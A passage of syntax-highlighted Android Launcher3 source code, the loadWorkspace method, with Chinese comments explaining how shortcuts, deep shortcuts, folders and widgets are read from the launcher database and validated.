class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadWorkspace</span><span class="params">(</span></span><br><span class="line"><span class="params">        List&lt;ShortcutInfo&gt; allDeepShortcuts,</span></span><br><span class="line"><span class="params">        Uri contentUri,</span></span><br><span class="line"><span class="params">        String selection,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> LoaderMemoryLogger logger)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略部门代码......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (mBgDataModel) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (!mStopped &amp;&amp; c.moveToNext()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (c.user == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 用户已被删除，删除该 item.</span></span><br><span class="line">                        c.markDeleted(<span class="string">&quot;User has been deleted&quot;</span>);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">allowMissingTarget</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                    <span class="comment">// 对数据库每一条的读取方式，按照类型区分，</span></span><br><span class="line">                    <span class="comment">// 最常见的是图标类型，SHORTCUT、APPLICATION、DEEP_SHORTCUT都是图标类型。</span></span><br><span class="line">                    <span class="comment">// 图标类型，在桌面上占据1x1的格子，且点击打开对应应用的属于图标大类。</span></span><br><span class="line">                    <span class="keyword">switch</span> (c.itemType) &#123;</span><br><span class="line">                    <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_SHORTCUT:</span><br><span class="line">                    <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_APPLICATION:</span><br><span class="line">                    <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT:</span><br><span class="line">                        <span class="comment">// 下面这句代码是从 c 获取 intent</span></span><br><span class="line">                        <span class="comment">// intent 参数来源有三处。一个是xml文件中，在首次开机的时候；</span></span><br><span class="line">                        <span class="comment">// 一个是packagemanager，手机里面安装的应用的intent 都是知道的；</span></span><br><span class="line">                        <span class="comment">// 最后是快捷方式生成的intent。 Intent是用来启动应用的参数。</span></span><br><span class="line">                        intent = c.parseIntent();</span><br><span class="line">                        <span class="keyword">if</span> (intent == <span class="literal">null</span>) &#123;</span><br><span class="line">                            c.markDeleted(<span class="string">&quot;Invalid or null intent&quot;</span>);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="type">int</span> <span class="variable">disabledState</span> <span class="operator">=</span> mUserManagerState.isUserQuiet(c.serialNumber)</span><br><span class="line">                                ? WorkspaceItemInfo.FLAG_DISABLED_QUIET_USER : <span class="number">0</span>;</span><br><span class="line">                        <span class="type">ComponentName</span> <span class="variable">cn</span> <span class="operator">=</span> intent.getComponent();</span><br><span class="line">                        targetPkg = cn == <span class="literal">null</span> ? intent.getPackage() : cn.getPackageName();</span><br><span class="line">                        <span class="comment">// 检查是否有对应的package name，如果没有传入包名则不是应用</span></span><br><span class="line">                        <span class="keyword">if</span> (TextUtils.isEmpty(targetPkg) &amp;&amp;</span><br><span class="line">                                c.itemType != LauncherSettings.Favorites.ITEM_TYPE_SHORTCUT) &#123;</span><br><span class="line">                            c.markDeleted(<span class="string">&quot;Only legacy shortcuts can have null package&quot;</span>);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">validTarget</span> <span class="operator">=</span> TextUtils.isEmpty(targetPkg) ||</span><br><span class="line">                                mLauncherApps.isPackageEnabled(targetPkg, c.user);</span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> (cn != <span class="literal">null</span> &amp;&amp; validTarget &amp;&amp; c.itemType</span><br><span class="line">                                != LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT) &#123;</span><br><span class="line">                            <span class="comment">// 检查对应的应用是否在系统中为disable状态，如果为disable状态，则不显示。</span></span><br><span class="line">                            <span class="comment">// 通过 isActivityEnabled() 来判断。 当用户在设置里面对某个应用设置为 disable，回到 Launcher 的时候，Launche r的数据库里面还是保留着该应用。</span></span><br><span class="line">                            <span class="comment">// 这里会进行一个判断，当数据库有，但手机不支持的时候，不显示</span></span><br><span class="line">                            <span class="keyword">if</span> (mLauncherApps.isActivityEnabled(cn, c.user)) &#123;</span><br><span class="line">    </span><br><span class="line">                                c.markRestored();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">// Gracefully try to find a fallback activity.</span></span><br><span class="line">                                intent = pmHelper.getAppLaunchIntent(targetPkg, c.user);</span><br><span class="line">                                <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    c.restoreFlag = <span class="number">0</span>;</span><br><span class="line">                                    c.updater().put(</span><br><span class="line">                                            LauncherSettings.Favorites.INTENT,</span><br><span class="line">                                            intent.toUri(<span class="number">0</span>)).commit();</span><br><span class="line">                                    cn = intent.getComponent();</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    c.markDeleted(<span class="string">&quot;Unable to find a launch target&quot;</span>);</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!TextUtils.isEmpty(targetPkg) &amp;&amp; !validTarget) &#123;</span><br><span class="line">                            <span class="comment">// 指向一个有效的应用程序（ cn != null），但该应用程序不可用</span></span><br><span class="line">                            <span class="keyword">if</span> (c.restoreFlag != <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="comment">// 软件包尚不可用，但稍后可能会安装。这种是显示在桌面上的                      </span></span><br><span class="line">                                tempPackageKey.update(targetPkg, c.user);</span><br><span class="line">                                <span class="keyword">if</span> (c.hasRestoreFlag(WorkspaceItemInfo.FLAG_RESTORE_STARTED)) &#123;</span><br><span class="line">                                    <span class="comment">// 恢复已开始一次</span></span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installingPkgs.containsKey(tempPackageKey)) &#123;</span><br><span class="line">                                    <span class="comment">// 应用恢复已开始。更新标志</span></span><br><span class="line">                                    c.restoreFlag |= WorkspaceItemInfo.FLAG_RESTORE_STARTED;</span><br><span class="line">                                    c.updater().put(LauncherSettings.Favorites.RESTORED,</span><br><span class="line">                                            c.restoreFlag).commit();</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">// 未恢复的应用程序已删除</span></span><br><span class="line">                                    c.markDeleted(<span class="string">&quot;Unrestored app removed: &quot;</span> + targetPkg);</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pmHelper.isAppOnSdcard(targetPkg, c.user)) &#123;</span><br><span class="line">                                <span class="comment">// 应用安装到手机，桌面上也放置了，但是应用安装在了SD卡里面，而此时此刻SD尚未读取完成。</span></span><br><span class="line">                                <span class="comment">// 这个时候仍然把图标放置到桌面上。</span></span><br><span class="line">                                <span class="comment">// 判断时，明确应用是安装在SD卡里，且SD卡没有读取到</span></span><br><span class="line"></span><br><span class="line">                                <span class="comment">// Package 存在但不可用</span></span><br><span class="line">                                disabledState |= WorkspaceItemInfo.FLAG_DISABLED_NOT_AVAILABLE;</span><br><span class="line">                                <span class="comment">// 在 workspace 中添加图标 .</span></span><br><span class="line">                                allowMissingTarget = <span class="literal">true</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isSdCardReady) &#123;</span><br><span class="line">                                <span class="comment">// SdCard 还没有准备好。一旦准备就绪，包可能会可用。缺少 pkg时，将延迟检查</span></span><br><span class="line">                </span><br><span class="line">                                mPendingPackages.add(<span class="keyword">new</span> <span class="title class_">PackageUserKey</span>(targetPkg, c.user));</span><br><span class="line">                                <span class="comment">// 在 workspace 中添加图标 .</span></span><br><span class="line">                                allowMissingTarget = <span class="literal">true</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">// 不再等待外部加载。</span></span><br><span class="line">                                c.markDeleted(<span class="string">&quot;Invalid package removed: &quot;</span> + targetPkg);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> ((c.restoreFlag &amp; WorkspaceItemInfo.FLAG_SUPPORTS_WEB_UI) != <span class="number">0</span>) &#123;</span><br><span class="line">                            validTarget = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (validTarget) &#123;</span><br><span class="line">                            <span class="comment">// The shortcut points to a valid target (either no target</span></span><br><span class="line">                            <span class="comment">// or something which is ready to be used)</span></span><br><span class="line">                            c.markRestored();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 部分图标在读取的时候采用低分辨率图标来提高读取速度。</span></span><br><span class="line">                        <span class="comment">// 区分方式是，用户是否能很快看到图标。</span></span><br><span class="line">                        <span class="comment">// Launcher 将文件夹中、不在文件夹小图标预览的应用设为低分辨率。</span></span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">useLowResIcon</span> <span class="operator">=</span> !c.isOnWorkspaceOrHotseat();</span><br><span class="line">                        <span class="comment">// 不同的图标细节不同。</span></span><br><span class="line">                        <span class="comment">// SHORTCUT 是独立的快捷方式</span></span><br><span class="line">                        <span class="comment">// DEEP_SHORTCUT 是依托于应用的快捷方式，</span></span><br><span class="line">                        <span class="comment">// 而 APPLICATION 就是应用。</span></span><br><span class="line">                        <span class="keyword">if</span> (c.restoreFlag != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">// Already verified above that user is same as default user</span></span><br><span class="line">                            info = c.getRestoredItemInfo(intent);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c.itemType ==</span><br><span class="line">                                LauncherSettings.Favorites.ITEM_TYPE_APPLICATION) &#123;</span><br><span class="line">                            <span class="comment">// 当itemtype是application的时候，会调用getAppShortcutInfo()，</span></span><br><span class="line">                            <span class="comment">// 在其中获取应用需要的数据存储在 shortcutinfo中，</span></span><br><span class="line">                            <span class="comment">// 这里生成的shortcutinfo对象具备一个在桌面上显示的快捷方式所需的一切资源，</span></span><br><span class="line">                            <span class="comment">// 比如名称，图标，点击后打开的intent等</span></span><br><span class="line">                            <span class="comment">// ******重要****getAppShortcutInfo() **********</span></span><br><span class="line">                            info = c.getAppShortcutInfo(</span><br><span class="line">                                    intent,</span><br><span class="line">                                    allowMissingTarget,</span><br><span class="line">                                    useLowResIcon,</span><br><span class="line">                                    !FeatureFlags.ENABLE_BULK_WORKSPACE_ICON_LOADING.get());</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c.itemType ==</span><br><span class="line">                                LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT) &#123;</span><br><span class="line">                            <span class="comment">// deep shortcut 和 application 是不一样的，</span></span><br><span class="line">                            <span class="comment">// deepshortcut 是和 systemservise 通过储存的快捷方式，手机在生成 deepshort 的时候，deepshortcut 点击所打开的对象是保存在手机里（不是Launcher里），同时传递一个id给Launcher，Launcher只保存id，</span></span><br><span class="line">                            <span class="comment">// 当用户点击 deepshortcut 的时候，Launcher用过id想手机申请打开id对应的目标对象。</span></span><br><span class="line">                            <span class="comment">// 这是新平台才有的功能。 此外，和application不同，deepshortcut 的图标是Launcher提供的。</span></span><br><span class="line"></span><br><span class="line">                            <span class="type">ShortcutKey</span> <span class="variable">key</span> <span class="operator">=</span> ShortcutKey.fromIntent(intent, c.user);</span><br><span class="line">                            <span class="keyword">if</span> (unlockedUsers.get(c.serialNumber)) &#123;</span><br><span class="line">                                <span class="type">ShortcutInfo</span> <span class="variable">pinnedShortcut</span> <span class="operator">=</span></span><br><span class="line">                                        shortcutKeyToPinnedShortcuts.get(key);</span><br><span class="line">                                <span class="keyword">if</span> (pinnedShortcut == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="comment">// 快捷方式不再有效。</span></span><br><span class="line">                                    c.markDeleted(<span class="string">&quot;Pinned shortcut not found&quot;</span>);</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                info = <span class="keyword">new</span> <span class="title class_">WorkspaceItemInfo</span>(pinnedShortcut, context);</span><br><span class="line">                                <span class="comment">// 如果不再发布 deep shortcut 快捷方式，请使用上次保存的图标，而不是默认图标</span></span><br><span class="line">                                mIconCache.getShortcutIcon(info, pinnedShortcut, c::loadIcon);</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (pmHelper.isAppSuspended(</span><br><span class="line">                                        pinnedShortcut.getPackage(), info.user)) &#123;</span><br><span class="line">                                    info.runtimeStatusFlags |= FLAG_DISABLED_SUSPENDED;</span><br><span class="line">                                &#125;</span><br><span class="line">                                intent = info.getIntent();</span><br><span class="line">                                allDeepShortcuts.add(pinnedShortcut);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">// 现在在禁用模式下创建快捷方式信息。</span></span><br><span class="line">                                info = c.loadSimpleWorkspaceItem();</span><br><span class="line">                                info.runtimeStatusFlags |= FLAG_DISABLED_LOCKED_USER;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123; <span class="comment">// item type == ITEM_TYPE_SHORTCUT</span></span><br><span class="line">                            info = c.loadSimpleWorkspaceItem();</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 快捷方式仅适用于主要配置文件</span></span><br><span class="line">                            <span class="keyword">if</span> (!TextUtils.isEmpty(targetPkg)</span><br><span class="line">                                    &amp;&amp; pmHelper.isAppSuspended(targetPkg, c.user)) &#123;</span><br><span class="line">                                disabledState |= FLAG_DISABLED_SUSPENDED;</span><br><span class="line">                            &#125;</span><br><span class="line">                            info.options = c.getInt(optionsIndex);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (intent.getAction() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                                intent.getCategories() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                                intent.getAction().equals(Intent.ACTION_MAIN) &amp;&amp;</span><br><span class="line">                                intent.getCategories().contains(Intent.CATEGORY_LAUNCHER)) &#123;</span><br><span class="line">                                intent.addFlags(</span><br><span class="line">                                    Intent.FLAG_ACTIVITY_NEW_TASK |</span><br><span class="line">                                    Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (info != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (info.itemType</span><br><span class="line">                                    != LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT) &#123;</span><br><span class="line">                                <span class="comment">// 跳过 deep shortcuts；他们的标题和图标已经在上面加载了。</span></span><br><span class="line">                                iconRequestInfos.add(</span><br><span class="line">                                        c.createIconRequestInfo(info, useLowResIcon));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            c.applyCommonProperties(info);</span><br><span class="line">                            <span class="comment">// 快捷方式的 spanX 和 spanY 默认是1，</span></span><br><span class="line">                            <span class="comment">// 则直接取一，intent则是从数据库里面获取的。</span></span><br><span class="line">                            info.intent = intent;</span><br><span class="line">                            info.rank = c.getInt(rankIndex);</span><br><span class="line">                            info.spanX = <span class="number">1</span>;</span><br><span class="line">                            info.spanY = <span class="number">1</span>;</span><br><span class="line">                            info.runtimeStatusFlags |= disabledState;</span><br><span class="line">                            <span class="keyword">if</span> (isSafeMode &amp;&amp; !isSystemApp(context, intent)) &#123;</span><br><span class="line">                                info.runtimeStatusFlags |= FLAG_DISABLED_SAFEMODE;</span><br><span class="line">                            &#125;</span><br><span class="line">                                <span class="type">LauncherActivityInfo</span> <span class="variable">activityInfo</span> <span class="operator">=</span> c.getLauncherActivityInfo();</span><br><span class="line">                                <span class="keyword">if</span> (activityInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    info.setProgressLevel(</span><br><span class="line">                                            PackageManagerHelper</span><br><span class="line">                                                .getLoadingProgress(activityInfo),</span><br><span class="line">                                            PackageInstallInfo.STATUS_INSTALLED_DOWNLOADING);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (c.restoreFlag != <span class="number">0</span> &amp;&amp; !TextUtils.isEmpty(targetPkg)) &#123;</span><br><span class="line">                                tempPackageKey.update(targetPkg, c.user);</span><br><span class="line">                                <span class="type">SessionInfo</span> <span class="variable">si</span> <span class="operator">=</span> installingPkgs.get(tempPackageKey);</span><br><span class="line">                                    <span class="keyword">if</span> (si == <span class="literal">null</span>) &#123;</span><br><span class="line">                                        info.runtimeStatusFlags &amp;=</span><br><span class="line">                                            ~ItemInfoWithIcon.FLAG_INSTALL_SESSION_ACTIVE;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (activityInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">                                        <span class="type">int</span> <span class="variable">installProgress</span> <span class="operator">=</span> (<span class="type">int</span>) (si.getProgress() * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">                                        info.setProgressLevel(</span><br><span class="line">                                                installProgress,</span><br><span class="line">                                                PackageInstallInfo.STATUS_INSTALLING);</span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 最终将数据存入缓存sBgDataModel中</span></span><br><span class="line">                            c.checkAndAddItem(info, mBgDataModel, logger);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Unexpected null WorkspaceItemInfo&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 文件夹数据类型是创建一个空的文件夹，文件夹不打开其他应用没有intent，</span></span><br><span class="line">                    <span class="comment">// 文件夹的名称title是区分文件夹的要素之一。</span></span><br><span class="line">                    <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_FOLDER:</span><br><span class="line">                        <span class="type">FolderInfo</span> <span class="variable">folderInfo</span> <span class="operator">=</span> mBgDataModel.findOrMakeFolder(c.id);</span><br><span class="line">                        c.applyCommonProperties(folderInfo);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 不要修剪文件夹标签，因为它是由用户设置的。</span></span><br><span class="line">                        folderInfo.title = c.getString(c.titleIndex);</span><br><span class="line">                        folderInfo.spanX = <span class="number">1</span>;</span><br><span class="line">                        folderInfo.spanY = <span class="number">1</span>;</span><br><span class="line">                        folderInfo.options = c.getInt(optionsIndex);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 恢复的文件夹不需要特殊处理</span></span><br><span class="line">                        c.markRestored();</span><br><span class="line">                        <span class="comment">// 文件夹也是放入缓存sBgDataModel中，桌面能显示的都要放在sBgDataModel中</span></span><br><span class="line">                        c.checkAndAddItem(folderInfo, mBgDataModel, logger);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// widget是需要设置spanX和spanY的，也只有widget才可能占两格以上。</span></span><br><span class="line">                        <span class="comment">// 同时，由于每个widget的显示内容都是由第三方的应用实时控制，所以在判断上比较繁琐。</span></span><br><span class="line">                    <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_APPWIDGET:</span><br><span class="line">                        <span class="keyword">if</span> (WidgetsModel.GO_DISABLE_WIDGETS) &#123;</span><br><span class="line">                            c.markDeleted(<span class="string">&quot;Only legacy shortcuts can have null package&quot;</span>);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// Follow through</span></span><br><span class="line">                    <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_CUSTOM_APPWIDGET:</span><br><span class="line">                        <span class="comment">// Read all Launcher-specific widget details</span></span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">customWidget</span> <span class="operator">=</span> c.itemType ==</span><br><span class="line">                            LauncherSettings.Favorites.ITEM_TYPE_CUSTOM_APPWIDGET;</span><br><span class="line"></span><br><span class="line">                        <span class="type">int</span> <span class="variable">appWidgetId</span> <span class="operator">=</span> c.getInt(appWidgetIdIndex);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">savedProvider</span> <span class="operator">=</span> c.getString(appWidgetProviderIndex);</span><br><span class="line">                        <span class="keyword">final</span> ComponentName component;</span><br><span class="line"></span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isSearchWidget</span> <span class="operator">=</span> (c.getInt(optionsIndex)</span><br><span class="line">                                &amp; LauncherAppWidgetInfo.OPTION_SEARCH_WIDGET) != <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (isSearchWidget) &#123;</span><br><span class="line">                            component  = QsbContainerView.getSearchComponentName(context);</span><br><span class="line">                            <span class="keyword">if</span> (component == <span class="literal">null</span>) &#123;</span><br><span class="line">                                c.markDeleted(<span class="string">&quot;Discarding SearchWidget without packagename &quot;</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            component = ComponentName.unflattenFromString(savedProvider);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isIdValid</span> <span class="operator">=</span> !c.hasRestoreFlag(</span><br><span class="line">                                LauncherAppWidgetInfo.FLAG_ID_NOT_VALID);</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">wasProviderReady</span> <span class="operator">=</span> !c.hasRestoreFlag(</span><br><span class="line">                                LauncherAppWidgetInfo.FLAG_PROVIDER_NOT_READY);</span><br><span class="line"></span><br><span class="line">                        <span class="type">ComponentKey</span> <span class="variable">providerKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentKey</span>(component, c.user);</span><br><span class="line">                        <span class="keyword">if</span> (!mWidgetProvidersMap.containsKey(providerKey)) &#123;</span><br><span class="line">                            mWidgetProvidersMap.put(providerKey,</span><br><span class="line">                                    widgetHelper.findProvider(component, c.user));</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">AppWidgetProviderInfo</span> <span class="variable">provider</span> <span class="operator">=</span></span><br><span class="line">                                mWidgetProvidersMap.get(providerKey);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isProviderReady</span> <span class="operator">=</span> isValidProvider(provider);</span><br><span class="line">                        <span class="keyword">if</span> (!isSafeMode &amp;&amp; !customWidget &amp;&amp;</span><br><span class="line">                                wasProviderReady &amp;&amp; !isProviderReady) &#123;</span><br><span class="line">                            c.markDeleted(</span><br><span class="line">                                    <span class="string">&quot;Deleting widget that isn&#x27;t installed anymore: &quot;</span></span><br><span class="line">                                    + provider);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (isProviderReady) &#123;</span><br><span class="line">                                appWidgetInfo = <span class="keyword">new</span> <span class="title class_">LauncherAppWidgetInfo</span>(appWidgetId,</span><br><span class="line">                                        provider.provider);</span><br><span class="line">                                <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> c.restoreFlag &amp;</span><br><span class="line">                                        ~LauncherAppWidgetInfo.FLAG_RESTORE_STARTED &amp;</span><br><span class="line">                                        ~LauncherAppWidgetInfo.FLAG_PROVIDER_NOT_READY;</span><br><span class="line">                                <span class="keyword">if</span> (!wasProviderReady) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (isIdValid) &#123;</span><br><span class="line">                                        status |= LauncherAppWidgetInfo.FLAG_UI_NOT_READY;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                appWidgetInfo.restoreStatus = status;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                Log.v(TAG, <span class="string">&quot;Widget restore pending id=&quot;</span> + c.id</span><br><span 